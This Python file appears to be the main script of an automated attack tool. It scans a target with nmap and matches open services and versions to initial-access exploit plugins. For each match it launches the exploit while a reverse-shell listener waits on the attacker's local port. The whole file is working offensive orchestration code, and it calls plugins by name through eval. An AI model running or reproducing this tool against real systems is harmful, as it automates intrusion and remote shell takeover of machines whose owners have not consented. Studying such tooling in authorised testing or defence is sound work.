import argparse
import socket
import recon
import socket
from multiprocessing import Process
import rs_client
import sys
import configparser
import os
from plugins.initial_access import *
import constants


def read_plugins_configs():
    config = configparser.ConfigParser()
    current_dir = os.path.dirname(os.path.abspath(__file__))
    initial_plugins_path = os.path.join(current_dir, constants.PLUGINS_DIR, constants.INITIAL_ACCESS_PLUGINS_DIR)
    configs = dict()
    for f in os.listdir(initial_plugins_path):
        if f.endswith('.ini'):
            config.read(os.path.join(initial_plugins_path, f))
            configs[config['DEFAULT']['plugin_name']] = { 
                'service' : config['DEFAULT']['service'],
                'versions' : config['DEFAULT']['versions']
            }

    return configs


def listener(listener_port, listener_address):
    sys.stdin = open(0)
    rs_client.main(listener_port, listener_address)


def exploit(plugin_name, target_ip, target_port, local_ip, local_port):
    try:
        print('[+] Running plugin {}'.format(plugin_name))
        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port)
        if res is True:
            print('[+] Exploit was successful !')
    except Exception as e:
        print(e)


def extract_ip():
    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:       
        st.connect(('10.255.255.255', 1))
        IP = st.getsockname()[0]
    except Exception as e:
        print(e)
        sys.exit()
    finally:
        st.close()
    return IP


if __name__ == '__main__':

    configs = read_plugins_configs()
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    parser.add_argument('-l', '--local_ip', type=str, help='local ip', required=False)
    parser.add_argument('-p', '--local_port', default=9001, type=int, help='local port', required=False)
    args = parser.parse_args()

    if args.local_ip == None:
        LOCAL_IP = extract_ip()
    else:
        LOCAL_IP = args.local_ip
    res_recon = recon.nmap_scan(args.target_ip)

    BUFFER_SIZE = 1024 * 128
    SEPARATOR = '<sep>'
    
    for i in res_recon:
        print('[+] Looking for exploits for port {}'.format(i['port']))
        for plugin_name, values in configs.items():
            if i['product'] == values['service'] and i ['version'] in values['versions']:
                target_port = i['port']
                listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP))
                listener_process.start()
                exploit_process = Process(target=exploit, args = (plugin_name, args.target_ip, target_port, LOCAL_IP, args.local_port))
                exploit_process.start()
                listener_process.join()
                exploit_process.join()
            else:
                print('[-] No exploit available for this port')
